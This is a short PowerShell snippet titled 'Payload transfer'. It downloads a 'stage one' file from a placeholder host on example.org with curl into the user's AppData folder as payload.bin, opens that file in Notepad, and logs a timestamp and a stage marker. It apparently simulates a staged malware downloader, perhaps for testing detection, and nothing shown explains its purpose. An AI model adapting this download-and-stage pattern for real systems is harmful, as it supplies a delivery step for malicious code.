# Payload transfer
$Stage1Url = 'http://example.org:8080/update.dat'
$Stage2Path = "$env:APPDATA\payload.bin"
curl.exe -s -L -o $Stage2Path $Stage1Url
Start-Process -FilePath "notepad.exe" -ArgumentList $Stage2Path
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$StageMarker = "stage-18"
